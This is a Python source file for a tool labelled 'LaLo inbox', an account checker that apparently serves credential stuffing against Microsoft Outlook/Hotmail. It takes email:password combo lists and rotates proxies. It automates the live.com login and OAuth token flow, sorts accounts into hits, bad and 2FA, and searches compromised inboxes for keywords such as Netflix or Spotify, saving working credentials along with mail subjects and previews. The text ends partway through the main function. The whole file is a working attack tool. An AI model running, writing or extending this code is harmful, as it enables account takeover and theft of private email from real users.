import re
import time
import os
import shutil
import json
import uuid
import random
import threading
import sys
import signal
import argparse
from datetime import datetime
from pathlib import Path
from threading import Lock, Event
from concurrent.futures import ThreadPoolExecutor, as_completed
from urllib.parse import unquote

import requests
import urllib3
urllib3.disable_warnings()

_TIMEOUT = (8, 15)

UA_FIREFOX = 'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:152.0) Gecko/20100101 Firefox/152.0'
UA_MOBILE  = 'Mozilla/5.0 (Linux; Android 11; Pixel 5 Build/RQ1A.210205.004; wv) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/68.0.3440.70 Mobile Safari/537.36'
UA_CHROME  = 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/150.0.0.0 Safari/537.36'

CLIENT_ID = '9199bf20-a13f-4107-85dc-02114787ef48'
REDIRECT  = 'https://outlook.live.com/mail/oauthRedirect.html'
SCOPE     = 'service::outlook.office.com::MBI_SSL openid profile offline_access'

DEFAULT_THREADS = 5
MAX_THREADS     = 200


class Colors:
    HEADER = '\033[95m'
    BLUE   = '\033[94m'
    CYAN   = '\033[96m'
    GREEN  = '\033[92m'
    WARN   = '\033[93m'
    FAIL   = '\033[91m'
    ENDC   = '\033[0m'
    BOLD   = '\033[1m'


# ---------------------------------------------------------------- yardımcılar
def _pick_file(title, filetypes=None):
    """tkinter ile dosya seçme penceresi. tkinter yoksa None döner."""
    try:
        import tkinter as tk
        from tkinter import filedialog
    except ImportError:
        return None
    try:
        root = tk.Tk()
        root.withdraw()
        root.attributes("-topmost", True)
        path = filedialog.askopenfilename(
            title=title,
            filetypes=filetypes or [("Text", "*.txt"), ("All", "*.*")]
        )
        root.destroy()
    except Exception:
        return None
    return path or None


def _ask_path(title, hint, filetypes=None):
    """Önce pencere açar; olmazsa terminalden yol sorar; olmazsa None."""
    path = _pick_file(title, filetypes)
    if path:
        return path
    # fallback: manuel giriş
    try:
        p = input(f"{Colors.BOLD}[?] {hint} (bos = iptal): {Colors.ENDC}").strip().strip('"').strip("'")
    except (EOFError, KeyboardInterrupt):
        return None
    return p or None


# ---------------------------------------------------------------- proxy
class ProxyManager:
    def __init__(self, proxy_file=None):
        self.proxies = []
        if proxy_file and os.path.isfile(proxy_file):
            with open(proxy_file, encoding='utf-8', errors='ignore') as f:
                self.proxies = [l.strip() for l in f if l.strip()]
        self._lock = Lock()

    def has_proxies(self):
        return bool(self.proxies)

    def get(self):
        if not self.proxies:
            return None
        with self._lock:
            p = random.choice(self.proxies)
        if '@' in p:
            s = f"http://{p}"
        else:
            parts = p.split(':')
            if len(parts) >= 4:
                s = f"http://{parts[2]}:{parts[3]}@{parts[0]}:{parts[1]}"
            elif len(parts) == 2:
                s = f"http://{parts[0]}:{parts[1]}"
            else:
                s = f"http://{p}"
        return {"http": s, "https": s}


# ---------------------------------------------------------------- checker
class InboxChecker:
    def __init__(self, mode, keyword=None, proxy_manager=None):
        self.mode = mode
        self.keyword = keyword or ""
        self.proxy_manager = proxy_manager

    def _new_session(self):
        s = requests.Session()
        s.verify = False
        if self.proxy_manager:
            px = self.proxy_manager.get()
            if px:
                s.proxies.update(px)
        return s

    def _extract_server_data(self, body):
        m = re.search(r'ServerData\s*=\s*(\{[\s\S]*?\})\s*;', body)
        if not m:
            return {}
        try:
            return json.loads(m.group(1))
        except Exception:
            return {}

    def _lr(self, text, left, right):
        s = text.find(left)
        if s < 0:
            return ''
        e = text.find(right, s + len(left))
        if e < 0:
            return ''
        return text[s + len(left):e]

    def _cookie(self, session, name):
        for c in session.cookies:
            if c.name == name:
                return c.value
        return ''

    def _is_2fa(self, body, url):
        markers = [
            'RecoverAccount?mkt=', 'finisherror.srf?edata', 'recover?mkt',
            'Update?mkt', 'notice?mkt', 'proofs/Verify?mkt', 'proofs/Add',
            'accrue?mkt', 'identity/confirm', 'cancel?mkt', 'Abuse?mkt',
        ]
        hay = (url or '') + body
        return any(m in hay for m in markers)

    def _is_bad(self, body, code):
        markers = [
            "You've tried to sign in too many times",
            "tried to sign in too many times with an",
            "Your account or password is incorrect",
            "The account or password is incorrec",
            "Please enter the password for your Microsoft account",
            "That Microsoft account doesn't exist",
            "Bad user credential or too many signin attempts",
        ]
        if any(m in body for m in markers):
            return True
        if code == 403:
            return True
        return False

    def check(self, email, password):
        try:
            session = self._new_session()
            code_verifier  = uuid.uuid4().hex + uuid.uuid4().hex
            code_challenge = code_verifier

            r1 = session.get(
                "https://login.live.com/oauth20_authorize.srf"
                f"?client_id={CLIENT_ID}"
                f"&scope=service%3A%3Aoutlook.office.com%3A%3AMBI_SSL%20openid%20profile%20offline_access"
                f"&redirect_uri=https%3A%2F%2Foutlook.live.com%2Fmail%2FoauthRedirect.html"
                f"&response_type=code"
                f"&code_challenge={code_challenge}"
                f"&code_challenge_method=plain",
                headers={
                    "User-Agent": UA_FIREFOX,
                    "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
                    "Accept-Language": "en-US,en;q=0.9",
                    "Upgrade-Insecure-Requests": "1",
                },
                timeout=_TIMEOUT,
                allow_redirects=True,
            )
            body = r1.text
            sd = self._extract_server_data(body)

            ppft = ''
            if sd.get('sFTTag'):
                m = re.search(r'value="([^"]+)"', sd['sFTTag'])
                if m:
                    ppft = m.group(1)
            if not ppft:
                ppft = self._lr(body, 'name="PPFT" id="i0327" value="', '"')
            if not ppft:
                ppft = self._lr(body, 'name="PPFT" value="', '"')

            url_post = sd.get('urlPost', '') or self._lr(body, 'action="', '"')
            if not url_post:
                return {"status": "ERROR", "msg": "no_urlPost"}
            if not ppft:
                return {"status": "ERROR", "msg": "no_ppft"}

            ctx        = sd.get('sCtx', '') or self._lr(body, 'contextid%3D', '%26')
            opid       = self._lr(body, 'opid%3D', '%26')
            flow_token = sd.get('sPOST_PaginatedLoginState', '') or sd.get('sFT', '')
            uaid       = self._cookie(session, 'uaid')
            bk         = ''
            mspr       = self._cookie(session, 'MSPRequ')
            if mspr:
                m = re.search(r'lt=([^&]+)', mspr)
                if m:
                    bk = m.group(1)

            r2 = session.post(
                "https://login.live.com/GetCredentialType.srf"
                f"?opid={opid}&id=38936&id=38936&mkt=EN-US&lc=1033&uaid={uaid}",
                json={
                    "checkPhones": True,
                    "country": "",
                    "federationFlags": 3,
                    "flowToken": flow_token,
                    "forceotclogin": False,
                    "isCookieBannerShown": False,
                    "isExternalFederationDisallowed": False,
                    "isFederationDisabled": False,
                    "isFidoSupported": True,
                    "isOtherIdpSupported": False,
                    "isReactLoginRequest": True,
                    "isRemoteConnectSupported": False,
                    "isRemoteNGCSupported": True,
                    "isSignup": False,
                    "originalRequest": "",
                    "otclogindisallowed": False,
                    "uaid": uaid,
                    "username": email,
                },
                headers={
                    "User-Agent": UA_FIREFOX,
                    "Accept": "application/json",
                    "Accept-Language": "en-US,en;q=0.9",
                    "Content-Type": "application/json; charset=utf-8",
                    "Origin": "https://login.live.com",
                    "Referer": "https://login.live.com/ppsecure/secure.srf",
                    "Host": "login.live.com",
                    "hpgid": "33",
                    "hpgact": "0",
                    "correlationId": uaid,
                    "client-request-id": uaid,
                    "Sec-Fetch-Dest": "empty",
                    "Sec-Fetch-Mode": "cors",
                    "Sec-Fetch-Site": "same-origin",
                },
                timeout=_TIMEOUT,
            )
            gct_body = r2.text or ''
            if 'IfExistsResult":1' in gct_body or '"ErrorHR":"80041103"' in gct_body:
                return {"status": "BAD"}

            post_url = (
                f"https://login.live.com/ppsecure/post.srf?username={email}"
                f"&cobrandid=90015&id=292841&contextid={ctx}&opid={opid}"
                f"&bk={bk}&uaid={uaid}&pid=0"
            )
            referer = (
                f"https://login.live.com/login.srf?wa=wsignin1.0&rpsnv=151&ct=1715228498"
                f"&rver=7.0.6738.0&wp=MBI_SSL"
                f"&wreply=https%3a%2f%2foutlook.live.com%2fowa%2f%3fusername%3d{email}"
                f"&id=292841&aadredir=0&username={email}&CBCXT=out&lw=1"
                f"&fl=dob%2cflname%2cwld&cobrandid=90015&login_hint={email}"
            )
            r3 = session.post(
                post_url,
                data={
                    "ps": "2",
                    "psRNGCDefaultType": sd.get('sPOST_PaginatedLoginStateRNGCDefaultType', ''),
                    "psRNGCEntropy": sd.get('sPOST_PaginatedLoginStateRNGCEntropy', ''),
                    "psRNGCSLK": sd.get('sPOST_PaginatedLoginStateRNGCSLK', ''),
                    "canary": sd.get('sCanary', '') or sd.get('canary', ''),
                    "ctx": ctx,
                    "hpgrequestid": "",
                    "PPFT": ppft,
                    "PPSX": "Pa",
                    "NewUser": "1",
                    "FoundMSAs": "",
                    "fspost": "0",
                    "i21": "0",
                    "CookieDisclosure": "0",
                    "IsFidoSupported": "0",
                    "isSignupPost": "0",
                    "isRecoveryAttemptPost": "0",
                    "i13": "0",
                    "login": email,
                    "loginfmt": email,
                    "type": "11",
                    "LoginOptions": "3",
                    "lrt": "",
                    "lrtPartition": "",
                    "hisRegion": "",
                    "hisScaleUnit": "",
                    "passwd": password,
                },
                headers={
                    "User-Agent": UA_MOBILE,
                    "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8",
                    "Accept-Language": "en-US",
                    "Cache-Control": "max-age=0",
                    "Connection": "keep-alive",
                    "Origin": "https://login.live.com",
                    "Referer": referer,
                    "Host": "login.live.com",
                    "Content-Type": "application/x-www-form-urlencoded",
                    "Upgrade-Insecure-Requests": "1",
                    "Sec-Fetch-Dest": "document",
                    "Sec-Fetch-Mode": "navigate",
                    "Sec-Fetch-Site": "same-origin",
                    "Sec-Fetch-User": "?1",
                },
                timeout=_TIMEOUT,
                allow_redirects=False,
            )
            final_url = r3.headers.get('Location', '') or r3.url or ''
            body3 = r3.text or ''

            if self._is_2fa(body3, final_url):
                return {"status": "2FA"}
            if self._is_bad(body3, r3.status_code):
                return {"status": "BAD"}

            code_val = None
            if 'code=' in final_url:
                m = re.search(r'code=([^&]+)', final_url)
                if m:
                    code_val = unquote(m.group(1))

            if not code_val:
                r4 = session.get(
                    "https://login.microsoftonline.com/consumers/oauth2/v2.0/authorize"
                    f"?client_id={CLIENT_ID}"
                    f"&scope=service%3A%3Aoutlook.office.com%3A%3AMBI_SSL%20openid%20profile%20offline_access"
                    f"&redirect_uri=https%3A%2F%2Foutlook.live.com%2Fmail%2FoauthRedirect.html"
                    f"&response_mode=fragment&client_info=1&clidata=1&prompt=none"
                    f"&response_type=code"
                    f"&code_challenge={code_challenge}"
                    f"&code_challenge_method=plain",
                    headers={
                        "User-Agent": UA_CHROME,
                        "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8",
                        "Accept-Language": "en-US,en;q=0.9",
                        "Upgrade-Insecure-Requests": "1",
                        "Referer": "https://outlook.live.com/",
                        "Sec-Fetch-Site": "cross-site",
                        "Sec-Fetch-Mode": "navigate",
                        "Sec-Fetch-Dest": "iframe",
                    },
                    timeout=_TIMEOUT,
                    allow_redirects=False,
                )
                address = r4.headers.get('Location', '')
                if address:
                    r5 = session.get(
                        address,
                        headers={
                            "User-Agent": UA_CHROME,
                            "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8",
                            "Accept-Language": "en-US,en;q=0.9",
                            "Upgrade-Insecure-Requests": "1",
                            "Referer": "https://outlook.live.com/",
                            "Sec-Fetch-Site": "cross-site",
                            "Sec-Fetch-Mode": "navigate",
                            "Sec-Fetch-Dest": "iframe",
                        },
                        timeout=_TIMEOUT,
                        allow_redirects=False,
                    )
                    loc = r5.headers.get('Location', '')
                    if 'code=' in loc:
                        m = re.search(r'code=([^&]+)', loc)
                        if m:
                            code_val = unquote(m.group(1))

            if not code_val:
                return {"status": "BAD"}

            r6 = session.post(
                "https://login.microsoftonline.com/consumers/oauth2/v2.0/token",
                data={
                    "client_id": CLIENT_ID,
                    "redirect_uri": REDIRECT,
                    "scope": SCOPE,
                    "code": code_val,
                    "code_verifier": code_challenge,
                    "grant_type": "authorization_code",
                    "client_info": "1",
                },
                headers={
                    "User-Agent": UA_CHROME,
                    "Content-Type": "application/x-www-form-urlencoded;charset=utf-8",
                    "Accept": "*/*",
                    "Origin": "https://outlook.live.com",
                    "Referer": "https://outlook.live.com/",
                    "Sec-Fetch-Site": "cross-site",
                    "Sec-Fetch-Mode": "cors",
                    "Sec-Fetch-Dest": "empty",
                },
                timeout=_TIMEOUT,
            )
            try:
                tok = r6.json()
            except Exception:
                return {"status": "BAD"}
            token = tok.get('access_token')
            if not token:
                return {"status": "BAD"}

            r7 = session.post(
                "https://outlook.live.com/owa/startupdata.ashx?app=Mail&n=0",
                headers={
                    "User-Agent": UA_CHROME,
                    "Authorization": f'MSAuth1.0 usertoken="{token}", type="MSACT"',
                    "x-req-source": "Mail",
                    "action": "StartupData",
                    "Accept": "*/*",
                    "Origin": "https://outlook.live.com",
                    "Referer": "https://outlook.live.com/",
                    "Sec-Fetch-Site": "same-origin",
                    "Sec-Fetch-Mode": "cors",
                    "Sec-Fetch-Dest": "empty",
                    "Content-Length": "0",
                },
                data="",
                timeout=_TIMEOUT,
            )
            su = r7.text or ""
            name = ''
            unread = '0'
            total = '0'
            m = re.search(r'"UserDisplayName":"([^"]*)"', su)
            if m: name = m.group(1)
            m = re.search(r'"UnreadCount":(\d+)', su)
            if m: unread = m.group(1)
            m = re.search(r'"TotalCount":(\d+)', su)
            if m: total = m.group(1)

            if self.mode == "hotmail":
                return {
                    "status": "HIT",
                    "data": {
                        "mode": "hotmail",
                        "name": name,
                        "unread": unread,
                        "total": total,
                    }
                }

            r8 = session.post(
                "https://outlook.live.com/searchservice/api/v2/query?n=35",
                json={
                    "Cvid": "a013cde2-7158-199f-3e4d-23ccd6a2c4bc",
                    "Scenario": {"Name": "owa.react"},
                    "TimeZone": "UTC",
                    "TextDecorations": "Off",
                    "EntityRequests": [{
                        "EntityType": "Conversation",
                        "ContentSources": ["Exchange"],
                        "Filter": {"Or": [
                            {"Term": {"DistinguishedFolderName": "msgfolderroot"}},
                            {"Term": {"DistinguishedFolderName": "DeletedItems"}},
                        ]},
                        "From": 0,
                        "Query": {"QueryString": self.keyword},
                        "RefiningQueries": None,
                        "Size": 25,
                        "Sort": [
                            {"Field": "Score", "SortDirection": "Desc", "Count": 7},
                            {"Field": "Time", "SortDirection": "Desc"},
                        ],
                        "EnableTopResults": True,
                        "TopResultsCount": 7,
                    }],
                    "QueryAlterationOptions": {
                        "EnableSuggestion": True,
                        "EnableAlteration": True,
                        "SupportedRecourseDisplayTypes": [
                            "Suggestion", "NoResultModification",
                            "NoResultFolderRefinerModification",
                            "NoRequeryModification", "Modification",
                        ],
                    },
                    "LogicalId": "8a059e91-29a1-9b41-e9d2-fd0f21819f5d",
                },
                headers={
                    "User-Agent": UA_CHROME,
                    "Authorization": f'MSAuth1.0 usertoken="{token}", type="MSACT"',
                    "x-req-source": "Mail",
                    "Content-Type": "application/json",
                    "Accept": "*/*",
                    "Origin": "https://outlook.live.com",
                    "Referer": "https://outlook.live.com/",
                    "scenariotag": "1stPg_cv",
                    "x-owa-hosted-ux": "false",
                    "x-search-griffin-version": "GWSv2",
                    "x-ms-appname": "owa-reactmail",
                    "client-request-id": "1313db84-615b-b0fd-d86c-a1cdebe8df0e",
                    "Sec-Fetch-Site": "same-origin",
                    "Sec-Fetch-Mode": "cors",
                    "Sec-Fetch-Dest": "empty",
                },
                timeout=_TIMEOUT,
            )
            ss = r8.text or ""

            kw_total = '0'
            subject  = ''
            last_dt  = ''
            preview  = ''
            m = re.search(r'"Total":(\d+)', ss)
            if m: kw_total = m.group(1)
            m = re.search(r'"ConversationTopic":"([^"]*)"', ss)
            if m: subject = m.group(1)
            m = re.search(r'"LastDeliveryTime":"([^"]*)"', ss)
            if m: last_dt = m.group(1)
            m = re.search(r'"HitHighlightedSummary":"([^"]*)"', ss)
            if m: preview = m.group(1)

            data_out = {
                "mode": "keyword",
                "name": name,
                "unread": unread,
                "total": total,
                "keyword_total": kw_total,
                "keyword": self.keyword,
                "subject": subject,
                "last_dt": last_dt,
                "preview": preview[:80] if preview else '',
            }

            if kw_total and kw_total != '0':
                return {"status": "HIT", "data": data_out}
            return {"status": "BAD", "data": data_out}

        except requests.exceptions.Timeout:
            return {"status": "TIMEOUT"}
        except requests.exceptions.ProxyError:
            return {"status": "ERROR", "msg": "proxy_error"}
        except Exception as e:
            return {"status": "ERROR", "msg": str(e)[:80]}


# ---------------------------------------------------------------- sonuç
class ResultManager:
    def __init__(self, base_folder=None):
        if not base_folder:
            base_folder = f"results/LaLo_inbox_{datetime.now().strftime('%Y%m%d_%H%M%S')}"
        self.base = base_folder
        Path(base_folder).mkdir(parents=True, exist_ok=True)
        self._files = {
            'HIT':    os.path.join(base_folder, 'Hits.txt'),
            'BAD':    os.path.join(base_folder, 'Bad.txt'),
            '2FA':    os.path.join(base_folder, 'TwoFA.txt'),
            'BANNED': os.path.join(base_folder, 'Banned.txt'),
        }
        self._lock = Lock()

    def save(self, email, password, result):
        status = result.get('status')
        data   = result.get('data', {})
        line   = f"{email}:{password}"
        path = self._files.get(status)
        if not path:
            return

        if status == 'HIT':
            if data.get('mode') == 'hotmail':
                entry = (
                    f"{line} | Display Name = {data.get('name','')} | "
                    f"INBOX = {data.get('total','0')} | UNREAD = {data.get('unread','0')}"
                )
            else:
                entry = (
                    f"{line} | Display Name = {data.get('name','')} | "
                    f"HAVE MSG FROM {data.get('keyword','')} = ✔️ | "
                    f"TOTAL MSG = {data.get('keyword_total','0')} | "
                    f"LAST DATE = {data.get('last_dt','')} | "
                    f"subject = {data.get('subject','')} | {data.get('preview','')}"
                )
        elif status == 'BAD':
            entry = f"{line} | BAD"
        elif status == '2FA':
            entry = f"{line} | 2FA"
        elif status == 'BANNED':
            entry = f"{line} | BANNED"
        else:
            return

        with self._lock:
            with open(path, 'a', encoding='utf-8') as f:
                f.write(entry + '\n')


# ---------------------------------------------------------------- istatistik
class Stats:
    def __init__(self):
        self._lock    = Lock()
        self.start    = time.time()
        self.checked  = 0
        self.active   = 0
        self.hit      = 0
        self.bad      = 0
        self.twofa    = 0
        self.banned   = 0
        self.errors   = 0
        self.timeouts = 0

    def begin(self):
        with self._lock:
            self.active += 1

    def record(self, status):
        with self._lock:
            self.active  = max(0, self.active - 1)
            self.checked += 1
            if status == 'HIT':       self.hit      += 1
            elif status == 'BAD':     self.bad      += 1
            elif status == '2FA':     self.twofa    += 1
            elif status == 'BANNED':  self.banned   += 1
            elif status == 'ERROR':   self.errors   += 1
            elif status == 'TIMEOUT': self.timeouts += 1

    def snapshot(self):
        with self._lock:
            elapsed = time.time() - self.start
            cpm = int((self.checked / elapsed) * 60) if elapsed > 0 and self.checked else 0
            return dict(
                checked=self.checked, active=self.active, hit=self.hit, bad=self.bad,
                twofa=self.twofa, banned=self.banned,
                errors=self.errors, timeouts=self.timeouts, cpm=cpm
            )


stop_signal = False

def signal_handler(sig, frame):
    global stop_signal
    stop_signal = True

def _w():
    return shutil.get_terminal_size((120, 24)).columns

def _clear_line(width):
    sys.stdout.write('\r' + ' ' * width + '\r')

def _build_dash(stats, total):
    s = stats.snapshot()
    bar = (
        f"{Colors.HEADER}[#LaLo inbox]{Colors.ENDC} "
        f"{Colors.BOLD}{s['checked']}/{total}{Colors.ENDC} "
        f"Act:{Colors.WARN}{s['active']}{Colors.ENDC} | "
        f"{Colors.GREEN}Hit:{s['hit']}{Colors.ENDC} "
        f"{Colors.FAIL}Bad:{s['bad']}{Colors.ENDC} "
        f"{Colors.WARN}2FA:{s['twofa']}{Colors.ENDC} "
        f"{Colors.FAIL}Banned:{s['banned']}{Colors.ENDC} "
        f"Err:{s['errors']+s['timeouts']} "
        f"{Colors.BOLD}CPM:{s['cpm']}{Colors.ENDC}"
    )
    width = _w()
    bare = len(re.sub(r'\033\[[0-9;]*m', '', bar))
    return bar + ' ' * max(0, width - bare - 1)

def _dash_refresh_loop(stats, total, print_lock, stop_event):
    while not stop_event.is_set():
        time.sleep(0.5)
        if stop_event.is_set():
            break
        width = _w()
        dash  = _build_dash(stats, total)
        with print_lock:
            _clear_line(width)
            sys.stdout.write(dash)
            sys.stdout.flush()

def worker(email, password, checker, result_mgr, stats, print_lock, total):
    if stop_signal:
        return
    stats.begin()
    result = checker.check(email, password)
    status = result.get('status', 'ERROR')
    stats.record(status)
    result_mgr.save(email, password, result)

    data = result.get('data', {}) or {}
    if status == 'HIT':
        color = Colors.GREEN + Colors.BOLD
        if data.get('mode') == 'hotmail':
            extra = f" | {data.get('name','')} | inbox:{data.get('total','0')}"
        else:
            extra = f" | {data.get('name','')} | {data.get('keyword_total','0')} msg | {data.get('subject','')[:40]}"
    elif status == 'BAD':
        color = Colors.FAIL
        extra = ""
    elif status == '2FA':
        color = Colors.WARN
        extra = ""
    elif status == 'BANNED':
        color = Colors.FAIL
        extra = " | BANNED"
    elif status == 'TIMEOUT':
        color = Colors.WARN
        extra = ""
    else:
        color = Colors.FAIL
        extra = f" | {result.get('msg','')}"

    log  = f"{color}[{status}]{Colors.ENDC} {email}{extra}"
    dash = _build_dash(stats, total)
    width = _w()

    with print_lock:
        _clear_line(width)
        sys.stdout.write(log + '\n')
        sys.stdout.write(dash)
        sys.stdout.flush()

def print_banner():
    sys.stdout.write(f"""
{Colors.CYAN}╔═══════════════════════════════════════════════════════════╗
║          {Colors.BOLD}#LaLo inbox @b1s8x{Colors.ENDC}{Colors.CYAN}                        ║
║                 {Colors.HEADER}INBOX CHECKER{Colors.ENDC}{Colors.CYAN}                          ║
╚═══════════════════════════════════════════════════════════╝{Colors.ENDC}
""")
    sys.stdout.flush()

def ask_threads(provided=None):
    if provided is not None:
        return max(1, min(MAX_THREADS, provided))
    while True:
        raw = input(
            f"{Colors.BOLD}[?] Threads (1-{MAX_THREADS}, default {DEFAULT_THREADS}): {Colors.ENDC}"
        ).strip()
        if raw == "":
            return DEFAULT_THREADS
        try:
            n = int(raw)
            if 1 <= n <= MAX_THREADS:
                return n
        except ValueError:
            pass
        sys.stdout.write(f"{Colors.FAIL}[X] Enter a number between 1 and {MAX_THREADS}.{Colors.ENDC}\n")


def main():
    global stop_signal

    if os.name == 'nt':
        try:
            import ctypes
            kernel32 = ctypes.windll.kernel32
            kernel32.SetConsoleMode(kernel32.GetStdHandle(-11), 7)
        except Exception:
            os.system('')

    print_banner()

    parser = argparse.ArgumentParser()
    parser.add_argument('-i', '--input')
    parser.add_argument('-k', '--keyword', default=None)
    parser.add_argument('-m', '--mode', choices=['hotmail', 'keyword'], default=None)
    parser.add_argument('-p', '--proxy', default=None)
    parser.add_argument('-o', '--output')
    parser.add_argument('-t', '--threads', type=int, default=None)
    args = parser.parse_args()

    mode = args.mode
    if mode is None:
        sys.stdout.write(f"{Colors.BOLD}Choose mode:{Colors.ENDC}\n")
        sys.stdout.write(f"  {Colors.GREEN}1{Colors.ENDC}) Hotmail check (login only, no keyword)\n")
        sys.stdout.write(f"  {Colors.CYAN}2{Colors.ENDC}) Keyword search (login + inbox keyword)\n")
        pick = input(f"{Colors.BOLD}[?] Enter 1 or 2: {Colors.ENDC}").strip()
        mode = 'hotmail' if pick == '1' else 'keyword'

    keyword = ''
    if mode == 'keyword':
        keyword = args.keyword or input(f"{Colors.BOLD}[?] Keyword (netflix, spotify, epicgames, etc): {Colors.ENDC}").strip()
        if not keyword:
            sys.exit(1)

    # ---------- Combo dosyası: pencere ----------
    input_file = args.input
    if not input_file:
        sys.stdout.write(f"{Colors.BOLD}[?] Combo dosyasi seciliyor...{Colors.ENDC}\n")
        input_file = _ask_path("Combo dosyasini sec", "Combo dosya yolu")
        if not input_file:
            sys.stdout.write(f"{Colors.FAIL}[X] Dosya secilmedi.{Colors.ENDC}\n")
            sys.exit(1)

    # ---------- Proxy dosyası: pencere (opsiyonel) ----------
    if args.proxy is None:
        sys.stdout.write(
            f"{Colors.BOLD}[?] Proxy dosyasi sec (bos birakirsan proxyless calisir){Colors.
